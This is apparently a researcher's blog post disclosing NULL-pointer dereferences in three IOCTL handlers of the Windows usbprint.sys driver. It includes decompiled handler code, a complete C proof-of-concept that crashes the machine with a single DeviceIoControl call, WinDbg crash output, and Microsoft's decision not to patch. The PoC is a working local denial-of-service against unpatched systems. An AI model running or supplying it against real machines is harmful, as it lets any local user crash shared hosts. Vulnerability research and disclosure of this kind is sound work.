---
layout: post
title:  "Windows Kernel usbprint.sys - Classical IOCTL Vulnerability (Denial-of-Service)"
date:   2026-05-25 06:00:00 +0800
---

## Summary

Three IOCTL handler cases inside `usbprint.sys`'s `USBPRINT_ProcessIOCTL` dispatcher (RVA `0x140004bc0`) dereference the IRP's `SystemBuffer` pointer at offset 0 without first validating either (a) the pointer is non-NULL or (b) the `InputBufferLength` meets the field-width minimum. For `METHOD_BUFFERED` IOCTLs called with both `InputBufferLength == 0` and `OutputBufferLength == 0`, the I/O Manager performs no SystemBuffer allocation — the pointer remains as zero-initialized by `IoAllocateIrp`.

The result is a kernel-mode read of address `0x0000000000000000`. On Windows 8 and later, NULL Page Protection guarantees the bottom page is unmapped to kernel mode. The read raises `STATUS_ACCESS_VIOLATION` (`0xC0000005`) inside the IOCTL dispatcher, which propagates uncaught up through `nt!NtDeviceIoControlFile` and the system-service path, and the kernel bug-checks with `SYSTEM_SERVICE_EXCEPTION` (`0x3B`).

The dispatcher rebases the IOCTL switch — it computes a case ordinal `rax_12 = rax_5 - 0x220030` (where `rax_5` is `IO_STACK_LOCATION.Parameters.DeviceIoControl.IoControlCode`), then switches on `rax_12`. The mapping between switch case labels and real IOCTL codes is therefore:

| Case ordinal | Real IOCTL | Symbolic | Read width | Effective device-extension write |
|---|---|---|---|---|
| `case 0x18` | `0x00220048` | `SET_PROTOCOL` | 1 byte | Switches active interface (Prot_02 vs Prot_04) |
| `case 0x20` | `0x00220050` | `SET_PORT_NUMBER` | 4 bytes | Sets the printer port number (e.g. "USB001") in the registry |
| `case 0x24` | `0x00220054` | `SET_FLAG_BITS` | 1 byte | Sets a 2-bit flag controlling interface selection and FAX mode |

All three vulnerable IOCTLs are `METHOD_BUFFERED, FILE_ANY_ACCESS` and reachable from any local interactive user with handle access to the printer device-interface. Each IOCTL bug-checks the system on a single `DeviceIoControl` call with `lpInBuffer = NULL`, `nInBufferSize = 0`, `lpOutBuffer = NULL`, `nOutBufferSize = 0`. **Live reproduction of `case 0x18` (IOCTL `0x220048`) is included in the Observed Result section** with full WinDbg crash-dump analysis.

A sibling handler in the same dispatcher — `case 8` (IOCTL `0x220038`, `VENDOR_GET_COMMAND`) — demonstrates that the driver's author knows the correct validation pattern:

```c
case 8:
{
    int32_t rbx_6 = *(uint32_t*)((char*)Overlay + 0x10);   // InputBufferLength

    if (!MasterIrp || rbx_6 < 3)
    {
    label_1400052c1:
        rbx_2 = STATUS_INVALID_PARAMETER;
        arg2->IoStatus.Information = 0;
        goto label_1400059c6;
    }
    /* ...rest of handler uses MasterIrp safely... */
}
```

`Overlay + 0x10` is `IO_STACK_LOCATION.Parameters.DeviceIoControl.InputBufferLength` in the typed I/O-stack overlay; `MasterIrp` is the typed-union slot for `Irp->AssociatedIrp` (the decompiler renders the union via its first-declared member — `MasterIrp` — but the slot semantically holds `SystemBuffer` for METHOD_BUFFERED IOCTLs). The three buggy cases simply omit this validation. The fix is one helper function and three call sites.

Notably, `case 0x20` already **jumps to the very same `label_1400052c1` label** on a different precondition (the value-range check `rcx_32 - 1 > 0x3E6`), so the dispatcher even has the error path wired up — it just fails to use it to guard the buffer dereference that produces the value being range-checked.

---

## Vulnerability Analysis 

### 1. Affected code

The IOCTL dispatcher `USBPRINT_ProcessIOCTL` is at RVA `0x140004bc0` (registered in `DriverEntry` slot `IRP_MJ_DEVICE_CONTROL`). The decompiled view of the dispatcher prologue shows three layered entry guards before the switch is reached:

```c
char* DeviceExtension_2 = arg1->DeviceExtension;

if (!*(uint32_t*)(DeviceExtension_2 + 0x42c))         // interface-switch in progress?
{
    char rax_1 = *(uint8_t*)DeviceExtension_2;
    if (rax_1 != 1)                                   // device removing?
    {
        if (DeviceExtension_2[0x52c])                 // device started?
        {
            if (!rax_1)
            {
                int32_t rax_3 = *(uint32_t*)(DeviceExtension_2 + 0x528);
                *(uint32_t*)(DeviceExtension_2 + 0x528) += 1;          // IoCount++
                if (!rax_3)
                    arg3 = KeClearEvent(&DeviceExtension_2[0x510]);
            }

            void* Overlay     = *(uint64_t*)((char*)&arg2->Tail + 0x40);   // IO_STACK_LOCATION
            void* DeviceExtension_7 = arg1->DeviceExtension;
            int64_t* MasterIrp = *(uint64_t*)((char*)&arg2->AssociatedIrp + 0);   // <-- the SystemBuffer
            int32_t rax_5  = *(uint32_t*)((char*)Overlay + 0x18);   // IoControlCode
            int32_t r13    = *(uint32_t*)((char*)Overlay + 8);      // OutputBufferLength

            /* ...switch on (rax_5 - 0x220030)... */
        }
    }
}
```

Two observations from this prologue:

- **`MasterIrp` is the SystemBuffer**. The decompiler types the slot at `arg2->AssociatedIrp + 0` as a pointer because `_IRP::AssociatedIrp` is a 3-member union (`MasterIrp` / `IrpCount` / `SystemBuffer`) that all alias the same QWORD. For these METHOD_BUFFERED case bodies the field semantically holds `SystemBuffer`, and `*(uint8_t*)MasterIrp` / `*(uint32_t*)MasterIrp` is a direct read of `Irp->AssociatedIrp.SystemBuffer[0]`.
- **The IoCount at `+0x528` is incremented before the switch and decremented after `IofCompleteRequest`** (see lines 957–972 of the decompile). The bug-check happens before the decrement runs, leaving the FDO with a non-zero outstanding-I/O count — irrelevant for DoS but worth noting if a future variant ever recovers from the fault.

All three vulnerable case bodies use the same anti-pattern: read `*(uintN_t*)MasterIrp` directly with no preceding non-NULL or `InputBufferLength` validation.

#### 1.1 `case 0x18` — IOCTL `0x220048` — `SET_PROTOCOL` (RVA `0x14000546c`)

Decompilation (lines 332–471 of the input file):

```c
case 0x18:
{
    uint64_t rdi_1 = (uint64_t)*(uint8_t*)MasterIrp;          // [BUG] 1-byte NULL deref
    rbx_2 = STATUS_SUCCESS;

    if (!((char)(rdi_1 - 2) & 0xfd))
    {
        if ((uint8_t)rdi_1 == *(uint8_t*)((char*)DeviceExtension_7 + 0x424))
        {
            arg2->IoStatus.Information = 1;
            goto label_1400059c6;                              // already at this protocol
        }
        /* ...select interface, build pipe list, swap +0x560/+0x568/+0x570/+0x578... */
    }
    else
    {
        WriteDbgTraceWarning("USBPRINT_ProcessIOCTL",
            u"USBPRINT.SYS: Invalid protocol %d in SET_PROTOCOL",
            (uint64_t)(uint32_t)rdi_1);
        rbx_2 = STATUS_INVALID_PARAMETER;
        /* ... */
    }
    break;
}
```

Faulting instruction in disassembly:
```
0x14000546c   movzx edi, byte ptr [rdi]   ; jumptable case 2228296 (0x220048)
                                          ; rdi = SystemBuffer (= NULL when both lengths 0)
```

This handler's purpose is to switch the printer between unidirectional (legacy printer protocol = `0x02`) and bidirectional (IPP-USB protocol = `0x04`) interface alternate-settings. It expects a 1-byte input giving the desired protocol value. The downstream logic calls `USBPRINT_GetUSBConfigs` / `USBPRINT_SelectInterface` / `USBPRINT_BuildPipeList` and swaps the pipe-descriptor pointers at device-extension offsets `+0x560`/`+0x568`/`+0x570`/`+0x578` — but the NULL deref happens before any of that is reached.

#### 1.2 `case 0x20` — IOCTL `0x220050` — `SET_PORT_NUMBER` (RVA `0x1400055be`)

Decompilation (lines 508–529):

```c
case 0x20:
{
    int32_t rcx_32 = *(uint32_t*)MasterIrp;                  // [BUG] 4-byte NULL deref
    rbx_2 = STATUS_SUCCESS;

    if (rcx_32 - 1 > 0x3e6)
        goto label_1400052c1;                                // STATUS_INVALID_PARAMETER

    *(uint32_t*)((char*)DeviceExtension_7 + 0x580) = rcx_32;

    UNICODE_STRING var_50;
    var_50.Length        = 0;
    var_50.MaximumLength = 0;
    var_50.Buffer        = 0;
    RtlInitUnicodeString(&var_50, u"Port Number");
    ZwSetValueKey(
        *(uint64_t*)((char*)DeviceExtension_7 + 0x588),
        &var_50, 0, 4, (char*)DeviceExtension_7 + 0x580, 4);
    arg2->IoStatus.Information = 0;
    goto label_1400059c6;
}
```

Faulting instruction:
```
0x1400055be   mov ecx, [rdi]   ; jumptable case 2228304 (0x220050)
                                ; reads 4-byte port-number DWORD from SystemBuffer
```

This handler's purpose is to assign a port number (range-checked against `1..0x3E7`, i.e. 1..999) to the printer. The value is persisted to the device's `Port Number` registry value under `\Registry\Machine\System\CurrentControlSet\Enum\…` (the key handle lives at `DeviceExtension+0x588`) and is later consumed by `WritePortDescription` to construct the user-visible `USB001`/`USB002`/… port name.

The structural smell in the decompile is unmissable: the value-range check `if (rcx_32 - 1 > 0x3e6)` jumps to `label_1400052c1`, **which is the very `STATUS_INVALID_PARAMETER` label installed by `case 8` for its own buffer/length check**. The dispatcher author knew exactly which error code to return on bad input from this case — they wired the goto to the correct site — they just forgot that the value being range-checked was itself sourced from an unvalidated NULL-able pointer.

#### 1.3 `case 0x24` — IOCTL `0x220054` — `SET_FLAG_BITS` (RVA `0x14000562e`)

Decompilation (lines 530–538):

```c
case 0x24:
{
    rbx_2 = STATUS_SUCCESS;
    *(uint8_t*)((char*)DeviceExtension_7 + 0x438) = *(uint8_t*)MasterIrp & 3;   // [BUG] 1-byte NULL deref
    *(uint32_t*)((char*)&arg2->IoStatus. + 0) = 0;
    arg2->IoStatus.Information = 0;
    break;
}
```

Faulting instruction:
```
0x14000562e   movzx eax, byte ptr [rdi]   ; jumptable case 2228308 (0x220054)
```

This is the smallest of the three case bodies — three statements, no preamble, no recovery, no error path. It is the most compact possible reproduction of "missing input validation."

The byte stored at `DeviceExtension+0x438` is later consumed as a bit-flag:
- `(byte & 1)` — selects which cached interface info pool (`+0x550` for legacy, `+0x558` for IPP-USB) `WritePortDescription` uses. Read by `case 0x2c` (`ADD_CHILD_DEVICE`) at line 618 of this same decompile:
  ```c
  WritePortDescription(DeviceExtension_7,
      (uint32_t)*(uint8_t*)((char*)DeviceExtension_7 + 0x438) & 1);
  ```
- `(byte & 2)` — read in `case 0x2c` again at line 672 and passed as the `bUseFax` flag to `GetPrinterNameFrom1284Id` to append `(FAX)` to the device's friendly name:
  ```c
  int32_t rax_48 = GetPrinterNameFrom1284Id(rcx_42,
      *(uint8_t*)((char*)DeviceExtension_1 + 0x438) & 2,
      &var_c8);
  ```

So `SET_FLAG_BITS` configures interface selection and print-vs-fax presentation. It expects a 1-byte input. It validates neither pointer nor length.

---

### 2. The Bug

For `METHOD_BUFFERED` IOCTLs, the I/O Manager allocates `Irp->AssociatedIrp.SystemBuffer` only when `max(InputBufferLength, OutputBufferLength) > 0`. When both lengths are zero, no allocation is performed; the SystemBuffer pointer remains as zero-initialized by `IoAllocateIrp`. The decompiler types the slot at `arg2->AssociatedIrp + 0` as `MasterIrp` because `_IRP::AssociatedIrp` is a union of `MasterIrp`, `IrpCount`, and `SystemBuffer` — all of which alias the same QWORD. For these case bodies the field semantically holds `SystemBuffer`; reading `*(uintN_t*)MasterIrp` is a direct dereference of `*(SystemBuffer + 0)`.

Each affected case body proceeds straight to the deref with no:

- `if (!MasterIrp)` check (NULL pointer guard)
- `if (*(uint32_t*)((char*)Overlay + 0x10) < N)` check (length guard, where `Overlay + 0x10` is `Parameters.DeviceIoControl.InputBufferLength`)

The reference handler `case 8` in the same dispatcher does both checks:

```c
int32_t rbx_6 = *(uint32_t*)((char*)Overlay + 0x10);   // InputBufferLength
if (!MasterIrp || rbx_6 < 3) goto label_1400052c1;     // STATUS_INVALID_PARAMETER
```

This proves the validation pattern is known to the codebase — the three buggy cases simply omit it. `case 0x20` even routes to the same error label `label_1400052c1` for a value-range failure, so the omission of the buffer guard is unambiguously an oversight rather than an unfamiliar pattern.

The dereferenced address is `0x0000000000000000`. On Windows 8 and later, NULL Page Protection guarantees the first page is unmapped to kernel mode and `NtAllocateVirtualMemory` rejects sub-`0x10000` `BaseAddress` requests from user mode. The read therefore cannot be satisfied by any user-controllable mapping; the access produces a kernel-mode access violation that propagates up through the system-service path uncaught, and the kernel bug-checks with `SYSTEM_SERVICE_EXCEPTION` (`0x3B`). 

The bugs remain valuable as crash-on-demand against shared printer-equipped systems (terminal servers, kiosks, multi-user labs) and as a stable trigger pad in the unlikely event a future kernel-component bug enables low-page mapping. They are also worth fixing for code-quality reasons — the missing input validation is the same anti-pattern recently fixed in CVE-2026-32223 in the same driver.

--- 

## 3. Proof-of-Concept

### 3.1 Crafting the Proof of Concept

In all three cases, rdi == Irp->AssociatedIrp.SystemBuffer, which the I/O Manager leaves NULL for METHOD_BUFFERED IOCTLs called with both `InputBufferLength == 0` and `OutputBufferLength == 0`. The handlers dereference it without first validating, producing a kernel-mode NULL page fault. Prerequisite at least one USB printer device must be attached and bound to usbprint.sys. Either a physical printer or a USBIP-bridged virtual gadget.

```c
// poc_nullderef.c — usbprint.sys IOCTL handler NULL-deref BSOD trigger
// Build:  cl /W3 poc_nullderef.c setupapi.lib
//
// Usage:
//     poc_nullderef.exe                ; default — triggers 0x220048
//     poc_nullderef.exe 0x220048
//     poc_nullderef.exe 0x220050
//     poc_nullderef.exe 0x220054

#include <windows.h>
#include <setupapi.h>
#include <initguid.h>
#include <stdio.h>
#include <stdlib.h>
#pragma comment(lib, "setupapi.lib")

DEFINE_GUID(GUID_DEVINTERFACE_USBPRINT_LEGACY,
    0x28d78fad, 0x5a12, 0x11d1, 0xae, 0x5b, 0x00, 0x00, 0xf8, 0x03, 0xa8, 0xc2);
DEFINE_GUID(GUID_DEVINTERFACE_IPP_USB,
    0xf2f40381, 0xf46d, 0x4e51, 0xbc, 0xe7, 0x62, 0xde, 0x6c, 0xf2, 0xd0, 0x98);

#define DBG(fmt, ...) do {                                                   \
    SYSTEMTIME _t; GetLocalTime(&_t);                                        \
    fprintf(stderr, "[%02u:%02u:%02u.%03u] " fmt "\n",                       \
            _t.wHour, _t.wMinute, _t.wSecond, _t.wMilliseconds, __VA_ARGS__);\
    fflush(stderr);                                                          \
} while (0)

static const char *ioctl_name(DWORD ioctl) {
    switch (ioctl) {
    case 0x00220048: return "SET_PROTOCOL    (1-byte read at SystemBuffer+0)";
    case 0x00220050: return "SET_PORT_NUMBER (4-byte read at SystemBuffer+0)";
    case 0x00220054: return "SET_FLAG_BITS   (1-byte read at SystemBuffer+0)";
    default:         return "<not in known-vulnerable list>";
    }
}

static HANDLE find_usbprint_handle(void) {
    static const GUID *guids[]      = { &GUID_DEVINTERFACE_IPP_USB, &GUID_DEVINTERFACE_USBPRINT_LEGACY };
    static const char *guid_names[] = { "IPP-USB", "USBPRINT-legacy" };

    for (int gi = 0; gi < 2; gi++) {
        DBG("[*] Enumerating interface class: %s", guid_names[gi]);
        HDEVINFO set = SetupDiGetClassDevs(guids[gi], NULL, NULL,
                                           DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);
        if (set == INVALID_HANDLE_VALUE) {
            DBG("    SetupDiGetClassDevs failed: %lu", GetLastError());
            continue;
        }
        SP_DEVICE_INTERFACE_DATA ifd = { sizeof(ifd) };
        for (DWORD i = 0; SetupDiEnumDeviceInterfaces(set, NULL, guids[gi], i, &ifd); i++) {
            DWORD need = 0;
            SetupDiGetDeviceInterfaceDetailW(set, &ifd, NULL, 0, &need, NULL);
            PSP_DEVICE_INTERFACE_DETAIL_DATA_W d = (PSP_DEVICE_INTERFACE_DETAIL_DATA_W)malloc(need);
            d->cbSize = sizeof(*d);
            if (!SetupDiGetDeviceInterfaceDetailW(set, &ifd, d, need, NULL, NULL)) {
                free(d); continue;
            }
            DBG("    found: %ls", d->DevicePath);
            HANDLE h = CreateFileW(d->DevicePath,
                                   GENERIC_READ | GENERIC_WRITE,
                                   FILE_SHARE_READ | FILE_SHARE_WRITE,
                                   NULL, OPEN_EXISTING, 0, NULL);
            if (h != INVALID_HANDLE_VALUE) {
                DBG("    CreateFileW OK -> handle=%p", h);
                free(d);
                SetupDiDestroyDeviceInfoList(set);
                return h;
            }
            DBG("    CreateFileW failed: %lu", GetLastError());
            free(d);
        }
        SetupDiDestroyDeviceInfoList(set);
    }
    return INVALID_HANDLE_VALUE;
}

int main(int argc, char **argv) {
    DBG("usbprint NULL-deref BSOD PoC (CWE-476)");
    DBG("PID=%lu", GetCurrentProcessId());

    DWORD ioctl = 0x00220048;
    if (argc > 1) ioctl = (DWORD)strtoul(argv[1], NULL, 0);
    DBG("Target IOCTL: 0x%08X - %s", ioctl, ioctl_name(ioctl));

    HANDLE h = find_usbprint_handle();
    if (h == INVALID_HANDLE_VALUE) {
        DBG("[-] No usbprint device found. Plug in a printer (or attach USBIP gadget) and retry.");
        return 1;
    }

    DBG("");
    DBG("[*] Issuing DeviceIoControl with all-NULL/zero buffers...");
    DBG("    -> kernel allocates no SystemBuffer (since both lengths == 0)");
    DBG("    -> handler dereferences NULL at offset 0");
    DBG("    -> NULL Page Protection on Win8+ -> SYSTEM_SERVICE_EXCEPTION -> BSOD");
    DBG("");
    DBG("    On a vulnerable host the next syscall does not return.");

    DWORD ret = 0;
    SetLastError(0);
    BOOL ok = DeviceIoControl(h, ioctl, NULL, 0, NULL, 0, &ret, NULL);
    DWORD err = ok ? 0 : GetLastError();

    // We should never reach here on a vulnerable host.
    DBG("[!] UNEXPECTED: DeviceIoControl returned ok=%d err=%lu without crashing",
        ok, err);
    DBG("    Possible explanations:");
    DBG("    - Patched build (Microsoft fix landed)");
    DBG("    - NULL Page Protection somehow disabled (legacy / VM oddity)");
    DBG("    - This IOCTL was never reached (handle to wrong device, dispatcher bailed early)");

    CloseHandle(h);
    return 0;
}
```

### 3.2 Observed Result

Live reproduction of `case 0x18` (IOCTL `0x220048` — `SET_PROTOCOL`) under kernel debugging, its sole action is one `DeviceIoControl(h, 0x00220048, NULL, 0, NULL, 0, &ret, NULL)` call. The IOCTL value passed by the PoC is visible in the `KERNELBASE!DeviceIoControl` frame's first argument: `00000000`00220048` (matching `IOCTL_USBPRINT_SET_PROTOCOL`). The faulting instruction is at module base + `0x4bc0` (`USBPRINT_ProcessIOCTL`) + `0x8ac` = `case 0x18` body (= IOCTL `0x220048`). `rdi = 0x0000000000000000` is `Irp->AssociatedIrp.SystemBuffer` (typed `MasterIrp` in the decompile) — left NULL by the I/O Manager because both `InputBufferLength` and `OutputBufferLength` were zero in the PoC's `DeviceIoControl` call. The `movzx edi, byte ptr [rdi]` is the very first dereference of that pointer in the case body.

#### 3.2.1 Initial bugcheck and trap

```
KDTARGET: Refreshing KD connection

*** Fatal System Error: 0x0000003b
                       (0x00000000C0000005,0xFFFFF801E024546C,0xFFFFB888CA794B00,0x0000000000000000)

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

nt!DbgBreakPointWithStatus:
fffff804`d6ebb1b0 cc              int     3
```

Bugcheck `0x3B` = `SYSTEM_SERVICE_EXCEPTION`. The four arguments decode as:

| Arg | Value | Meaning |
|---|---|---|
| 1 | `0xC0000005` | `STATUS_ACCESS_VIOLATION` — the original exception status |
| 2 | `0xFFFFF801E024546C` | Faulting address (`= usbprint!USBPRINT_ProcessIOCTL+0x8ac`) |
| 3 | `0xFFFFB888CA794B00` | Trap-frame `CONTEXT` pointer |
| 4 | `0x0000000000000000` | Reserved |

#### 3.2.2 `!analyze -v` summary

```
BUGCHECK_CODE:  3b
BUGCHECK_P1: c0000005
BUGCHECK_P2: fffff801e024546c
BUGCHECK_P3: ffffb888ca794b00
BUGCHECK_P4: 0

CONTEXT:  ffffb888ca794b00 -- (.cxr 0xffffb888ca794b00)
rax=0000000000000006 rbx=0000000000060000 rcx=fffff801e024546c
rdx=ffffe08c7626dc70 rsi=ffffe08c7626d840 rdi=0000000000000000
rip=fffff801e024546c rsp=ffffb888ca795530 rbp=ffffb888ca795630
 r8=fffff801e0240000  r9=000000000000000e r10=ffffe08c6f77d9c0
r11=ffffe08c75d95390 r12=ffffe08c75d95390 r13=0000000000000000
r14=0000000000000000 r15=ffffe08c75d954e0
iopl=0         nv up ei ng nz na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00050286
usbprint!USBPRINT_ProcessIOCTL+0x8ac:
fffff801`e024546c 0fb63f          movzx   edi,byte ptr [rdi] ds:002b:00000000`00000000=??

PROCESS_NAME:  poc_220048.exe
SYMBOL_NAME:  usbprint!USBPRINT_ProcessIOCTL+8ac
MODULE_NAME: usbprint
IMAGE_NAME:  usbprint.sys
FAILURE_BUCKET_ID:  AV_VRF_usbprint!USBPRINT_ProcessIOCTL
OS_VERSION:  10.0.26100.1
BUILDLAB_STR:  ge_release
OSPLATFORM_TYPE:  x64
OSNAME:  Windows 10
FAILURE_ID_HASH:  {563a557e-1087-fde3-680d-afd9b49faa35}
```

#### 3.2.3 Faulting instruction and full call stack

```
1: kd> .cxr 0xffffb888ca794b00
... (registers as above) ...
usbprint!USBPRINT_ProcessIOCTL+0x8ac:
fffff801`e024546c 0fb63f          movzx   edi,byte ptr [rdi] ds:002b:00000000`00000000=??

STACK_TEXT:
ffffb888`ca795530   usbprint!USBPRINT_ProcessIOCTL+0x8ac    ; case 0x18 (IOCTL 0x220048) — the deref
ffffb888`ca795670   nt!IopfCallDriver+0x5b
ffffb888`ca7956b0   nt!IofCallDriver+0x13
ffffb888`ca7956e0   nt!IopSynchronousServiceTail+0x1c5
ffffb888`ca795790   nt!IopXxxControlFile+0x99c
ffffb888`ca795a00   nt!NtDeviceIoControlFile+0x5e
ffffb888`ca795a70   nt!KiSystemServiceCopyEnd+0x25
000000cd`5319f9f8   ntdll!NtDeviceIoControlFile+0x14
000000cd`5319fa00   KERNELBASE!DeviceIoControl+0x73
000000cd`5319fa70   KERNEL32!DeviceIoControlImplementation+0x75
000000cd`5319fac0   poc_220048+0x1497                       ; PoC's DeviceIoControl call site
```

## Vulnerability Disclosure

1. The vulnerability reported to MSRC on April 28, 2026.
2. MSRC updated the ticket saying no fix for this issue and mark as closed. MSRC replied:

```
Hi,

We’ve completed our investigation and determined that this case does not meet the criteria for servicing at this time.
However, we have logged it as a next-version candidate bug, and it will be evaluated for potential inclusion in a future release.

We appreciate you sharing this report with us. If you have any additional information that may impact our assessment,
please don’t hesitate to reach out.

Best,
MSRC
```
